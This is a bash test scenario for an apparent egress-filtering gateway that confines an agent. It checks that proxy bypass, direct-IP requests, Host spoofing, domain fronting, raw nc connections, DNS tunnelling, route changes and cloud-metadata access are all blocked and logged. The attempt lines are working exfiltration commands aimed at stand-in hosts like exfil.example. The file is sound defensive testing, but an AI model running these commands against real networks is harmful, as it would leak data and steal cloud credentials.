#!/usr/bin/env bash
# 05 — Proxy ignoré, IP directe, TCP brut, DNS externe, métadonnées cloud (EF-22, ENF-07, cahier §8).
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 05-contournement-proxy-ignore "curl --noproxy, IP directe, nc, DNS externe, métadonnées"
require_demo laurent-bot
positive_control laurent-bot
m="s05-$(rand_hex)"; since="$(now_iso)"
attempt laurent-bot "curl --noproxy '*'" "curl -sS --noproxy '*' --max-time 8 -d $m https://exfil.example/n"
attempt laurent-bot "direct IP (no DNS, no SNI)" "curl -sS -k --noproxy '*' --max-time 8 -d $m https://$EXFIL_IP/ip"
attempt laurent-bot "direct IP over HTTP" "curl -sS --noproxy '*' --max-time 8 -d $m http://$EXFIL_IP/ip80"
attempt laurent-bot "Host header spoofing" "curl -sS --noproxy '*' --max-time 8 -d $m -H 'Host: allowed.example' http://$EXFIL_IP/spoof"
attempt laurent-bot "domain fronting (SNI allowed, Host forbidden)" "curl -sS --max-time 8 -d $m -H 'Host: exfil.example' https://allowed.example/front"
attempt laurent-bot "raw TCP (nc)" "echo $m | nc -w 3 $EXFIL_IP 4444"
attempt laurent-bot "external DNS resolver" "dig +time=3 +tries=1 @$DEMO_DNS_IP $m.exfil.example A"
attempt laurent-bot "change the route (no NET_ADMIN)" "ip route replace default via 10.77.0.1"

# Public resolver: the query is intercepted by the gateway DNS; no answer for a forbidden name.
ans="$(agent_sh laurent-bot "dig +short +time=3 +tries=1 @8.8.8.8 $m.exfil.example A" 2>&1 || true)"
evidence "dig @8.8.8.8 $m.exfil.example -> '${ans}'"
printf '%s\n' "$ans" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' && fail "the public resolver path returned an address for a forbidden name"

# Cloud metadata: refused (403 or connection failure) AND logged as denied by the baseline rule.
meta="$(agent_sh laurent-bot "curl -s -o /dev/null -w '%{http_code}' --noproxy '*' --max-time 5 http://169.254.169.254/latest/meta-data/" 2>/dev/null || true)"
evidence "cloud metadata (direct): HTTP '${meta:-none}'"
case "$meta" in 403 | 000 | "") ;; *) fail "cloud metadata answered HTTP $meta" ;; esac
mflow="$(find_flow "$(agent_id laurent-bot)" 169.254.169.254 deny "$since")" || fail "no denied flow for 169.254.169.254"
[ "$(printf '%s' "$mflow" | jqx -r '.decision.rule_id')" = "$(demo_id "$(did 601)")" ] ||
  fail "metadata flow not denied by the baseline rule 'Métadonnées cloud': $(printf '%s' "$mflow" | jqx -c .decision)"
evidence "metadata denied by baseline rule #$(printf '%s' "$mflow" | jqx -r '.decision.rule_number')"

assert_not_received exfil "$m" "an HTTP, HTTPS or raw TCP attempt"
assert_not_received allowed-api "$m" "the domain-fronted / spoofed request"
# DNS tunnelling: a query for a forbidden name must never reach the outside resolver.
dc logs --since "$since" demo-dns 2>/dev/null | grep -q -- "$m" && fail "the DNS query for $m.exfil.example reached the outside resolver"
evidence "the outside resolver never saw $m.exfil.example"
agent_sh laurent-bot 'ip route' | grep -q "^default via $GATEWAY_IP " || fail "default route changed"
evidence "default route still via the gateway"
pass "aucune méthode de contournement n'a abouti"
